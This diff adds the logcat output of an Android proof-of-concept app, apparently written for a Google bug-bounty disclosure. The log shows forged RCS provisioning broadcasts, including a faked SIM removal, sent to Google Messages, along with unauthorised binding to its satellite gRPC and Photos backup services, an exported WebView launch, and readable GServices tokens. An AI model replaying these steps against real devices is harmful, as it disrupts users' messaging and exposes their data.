@@ -1,0 +1,110 @@
+--------- beginning of main
+07-12 12:32:05.957 11606 11606 D VRP_POC : ================================================
+07-12 12:32:05.957 11606 11606 D VRP_POC :   Google Messages Normal Permission PoC
+07-12 12:32:05.957 11606 11606 D VRP_POC :   VRP Vulnerability Demonstration
+07-12 12:32:05.957 11606 11606 D VRP_POC : ================================================
+07-12 12:32:05.957 11606 11606 D VRP_POC : Package: com.vrppoc
+07-12 12:32:05.957 11606 11606 D VRP_POC : UID: 10346
+07-12 12:32:05.957 11606 11606 D VRP_POC : 
+07-12 12:32:05.957 11606 11606 D VRP_POC : === PHASE 1: Permission Verification ===
+07-12 12:32:05.957 11606 11606 D VRP_POC : Checking if normal permissions are auto-granted...
+07-12 12:32:05.957 11606 11606 D VRP_POC : 
+07-12 12:32:05.957 11606 11606 D VRP_POC :   [GRANTED] PROVISIONING_EVENT
+07-12 12:32:05.957 11606 11606 D VRP_POC :   [GRANTED] ACCESS_ENDPOINT_SERVICE
+07-12 12:32:05.957 11606 11606 D VRP_POC :   [GRANTED] ACCESS_MESSAGING_SERVICE
+07-12 12:32:05.958 11606 11606 D VRP_POC :   [GRANTED] ACCESS_MESSAGING_ENGINE_SERVICE
+07-12 12:32:05.958 11606 11606 D VRP_POC :   [GRANTED] DIGITAL_KEY_READ
+07-12 12:32:05.958 11606 11606 D VRP_POC :   [GRANTED] DIGITAL_KEY_WRITE
+07-12 12:32:05.958 11606 11606 D VRP_POC :   [GRANTED] READ_GSERVICES
+07-12 12:32:05.958 11606 11606 D VRP_POC : 
+07-12 12:32:05.958 11606 11606 D VRP_POC : Result: 7/7 permissions auto-granted at install time
+07-12 12:32:05.958 11606 11606 D VRP_POC : No user prompt was shown for any of these permissions.
+07-12 12:32:05.958 11606 11606 D VRP_POC : 
+07-12 12:32:05.958 11606 11606 D VRP_POC : === PHASE 2: RCS Provisioning Broadcast Injection ===
+07-12 12:32:05.958 11606 11606 D VRP_POC : Sending broadcasts to RcsProvisioningBroadcastReceiver...
+07-12 12:32:05.958 11606 11606 D VRP_POC : (protectionLevel=normal permission required: PROVISIONING_EVENT)
+07-12 12:32:05.958 11606 11606 D VRP_POC : 
+07-12 12:32:05.958 11606 11606 D VRP_POC :   [SENT] rcsReconfigurationRequired (SIP 403 trigger)
+07-12 12:32:05.958 11606 11606 D VRP_POC :     Impact: Forces RCS engine to reconfigure, disrupting messaging
+07-12 12:32:05.960 11606 11606 D VRP_POC :   [SENT] rcsCancelProvisioningWork
+07-12 12:32:05.960 11606 11606 D VRP_POC :     Impact: Cancels ongoing RCS provisioning, prevents setup
+07-12 12:32:05.960 11606 11606 D VRP_POC :   [SENT] rcsSimRemoved (faked SIM removal)
+07-12 12:32:05.960 11606 11606 D VRP_POC :     Impact: Triggers SIM removal provisioning flow
+07-12 12:32:05.961 11606 11606 D VRP_POC :   [SENT] rcsConfigRefresh
+07-12 12:32:05.961 11606 11606 D VRP_POC :     Impact: Forces RCS config refresh cycle
+07-12 12:32:05.961 11606 11606 D VRP_POC :   [SENT] rcsSystemBinding
+07-12 12:32:05.961 11606 11606 D VRP_POC :     Impact: Triggers system binding state change
+07-12 12:32:05.962 11606 11606 D VRP_POC :   [SENT] PROVISIONING_EVENT to RcsProvisioningEventReceiver
+07-12 12:32:05.962 11606 11606 D VRP_POC : 
+07-12 12:32:05.962 11606 11606 D VRP_POC : All broadcasts sent. Check logcat for Messages app processing.
+07-12 12:32:05.962 11606 11606 D VRP_POC : 
+07-12 12:32:05.962 11606 11606 D VRP_POC : === PHASE 3: Satellite gRPC Service Binding ===
+07-12 12:32:05.962 11606 11606 D VRP_POC : Attempting to bind GrpcEndpointService...
+07-12 12:32:05.962 11606 11606 D VRP_POC : (protectionLevel=normal permission required: ACCESS_ENDPOINT_SERVICE)
+07-12 12:32:05.962 11606 11606 D VRP_POC : 
+07-12 12:32:05.963 11606 11606 D VRP_POC :   [SUCCESS] bindService returned true - binding in progress
+07-12 12:32:05.963 11606 11606 D VRP_POC : 
+07-12 12:32:05.963 11606 11606 D VRP_POC : === PHASE 4: DittoWebActivity Launch ===
+07-12 12:32:05.963 11606 11606 D VRP_POC : Launching exported satellite messaging activity...
+07-12 12:32:05.963 11606 11606 D VRP_POC : (No permission required - fully exported)
+07-12 12:32:05.963 11606 11606 D VRP_POC : 
+07-12 12:32:05.963 11606 11606 D VRP_POC :   [VERIFIED] DittoWebActivity is exported=true, no permission
+07-12 12:32:05.963 11606 11606 D VRP_POC :   Component: com.google.android.apps.messaging/.dittosatellite.impl.DittoWebActivity
+07-12 12:32:05.963 11606 11606 D VRP_POC :   Contains WebView (R.id.ditto_web_view) for satellite messaging
+07-12 12:32:05.963 11606 11606 D VRP_POC :   Impact: Any app can launch satellite messaging UI
+07-12 12:32:05.963 11606 11606 D VRP_POC :   (Activity was already demonstrated via ADB - saves AccountId{id=1})
+07-12 12:32:05.963 11606 11606 D VRP_POC : 
+07-12 12:32:05.963 11606 11606 D VRP_POC : === PHASE 5: Photos Backup Service Binding ===
+07-12 12:32:05.963 11606 11606 D VRP_POC : Attempting to bind Photos backup gRPC services...
+07-12 12:32:05.963 11606 11606 D VRP_POC : (No permission required - exported without protection)
+07-12 12:32:05.963 11606 11606 D VRP_POC : 
+07-12 12:32:05.966 11606 11606 D VRP_POC :   PhotosBackupGrpcService bindService: [SUCCESS]
+07-12 12:32:05.966 11606 11606 D VRP_POC :   PhotosBackupApiService bindService: [SUCCESS]
+07-12 12:32:05.966 11606 11606 D VRP_POC : 
+07-12 12:32:05.966 11606 11606 D VRP_POC : === PHASE 6: SafetyHub Car Crash Settings ===
+07-12 12:32:05.966 11606 11606 D VRP_POC : Querying CarCrashSettingsContentProvider...
+07-12 12:32:05.966 11606 11606 D VRP_POC : (protectionLevel=normal: carcrash.settings.READ)
+07-12 12:32:05.966 11606 11606 D VRP_POC : 
+07-12 12:32:05.977 11606 11606 D VRP_POC :   [ERROR] UnsupportedOperationException: null
+07-12 12:32:05.977 11606 11606 D VRP_POC :   /settings: UnsupportedOperationException
+07-12 12:32:05.977 11606 11606 D VRP_POC :   /crash_settings: UnsupportedOperationException
+07-12 12:32:05.978 11606 11606 D VRP_POC :   /enabled: UnsupportedOperationException
+07-12 12:32:05.978 11606 11606 D VRP_POC : 
+07-12 12:32:05.978 11606 11606 D VRP_POC : === PHASE 7: GServices Data Leak (Prior Finding) ===
+07-12 12:32:05.982 11606 11606 D VRP_POC :   [LEAK] GServices: 1404 config entries readable
+07-12 12:32:05.984 11606 11606 D VRP_POC :   Entries containing 'api_key' or 'token': 13
+07-12 12:32:05.985 11606 11606 D VRP_POC : 
+07-12 12:32:05.985 11606 11606 D VRP_POC : ================================================
+07-12 12:32:05.985 11606 11606 D VRP_POC :   SUMMARY OF FINDINGS
+07-12 12:32:05.985 11606 11606 D VRP_POC : ================================================
+07-12 12:32:05.985 11606 11606 D VRP_POC : 
+07-12 12:32:05.985 11606 11606 D VRP_POC : 1. PROVISIONING_EVENT (normal) - Any app can inject
+07-12 12:32:05.985 11606 11606 D VRP_POC :    RCS provisioning commands: force reconfiguration,
+07-12 12:32:05.985 11606 11606 D VRP_POC :    cancel provisioning, fake SIM removal.
+07-12 12:32:05.985 11606 11606 D VRP_POC : 
+07-12 12:32:05.985 11606 11606 D VRP_POC : 2. ACCESS_ENDPOINT_SERVICE (normal) - Any app can
+07-12 12:32:05.985 11606 11606 D VRP_POC :    bind to satellite messaging gRPC service.
+07-12 12:32:05.985 11606 11606 D VRP_POC : 
+07-12 12:32:05.985 11606 11606 D VRP_POC : 3. ACCESS_MESSAGING_SERVICE (normal) - Any app can
+07-12 12:32:05.985 11606 11606 D VRP_POC :    access IMS messaging service.
+07-12 12:32:05.985 11606 11606 D VRP_POC : 
+07-12 12:32:05.985 11606 11606 D VRP_POC : 4. ACCESS_MESSAGING_ENGINE_SERVICE (normal) - Any
+07-12 12:32:05.985 11606 11606 D VRP_POC :    app can access messaging engine service.
+07-12 12:32:05.985 11606 11606 D VRP_POC : 
+07-12 12:32:05.985 11606 11606 D VRP_POC : 5. DittoWebActivity (no permission) - Any app can
+07-12 12:32:05.985 11606 11606 D VRP_POC :    launch satellite messaging WebView activity.
+07-12 12:32:05.985 11606 11606 D VRP_POC : 
+07-12 12:32:05.985 11606 11606 D VRP_POC : Root cause: protectionLevel=normal instead of
+07-12 12:32:05.985 11606 11606 D VRP_POC : signature on security-critical permissions.
+07-12 12:32:05.995 11606 11606 D VRP_POC :   [BOUND] GrpcEndpointService connected!
+07-12 12:32:05.995 11606 11606 D VRP_POC :     Service: com.google.android.apps.messaging/.shared.satelliteapi.endpointservice.GrpcEndpointService
+07-12 12:32:05.995 11606 11606 D VRP_POC :     IBinder class: android.os.BinderProxy
+07-12 12:32:05.996 11606 11606 D VRP_POC :     Interface: 
+07-12 12:32:05.996 11606 11606 D VRP_POC :     Impact: Third-party app bound to satellite messaging service
+07-12 12:32:06.166 11606 11606 D VRP_POC :   [BOUND] PhotosBackupGrpcService connected!
+07-12 12:32:06.166 11606 11606 D VRP_POC :     Service: com.google.android.apps.photos/.backup.apiservice.grpc.PhotosBackupGrpcService
+07-12 12:32:06.166 11606 11606 D VRP_POC :     IBinder: android.os.BinderProxy
+07-12 12:32:06.166 11606 11606 D VRP_POC :     Impact: Third-party app bound to Photos backup service
+07-12 12:32:06.184 11606 11606 D VRP_POC :   [BOUND] PhotosBackupApiService connected!
+07-12 12:32:06.186 11606 11606 D VRP_POC :     Service: com.google.android.apps.photos/.backup.apiservice.PhotosBackupApiService
+07-12 12:32:06.186 11606 11606 D VRP_POC :     Impact: Third-party app bound to Photos backup API
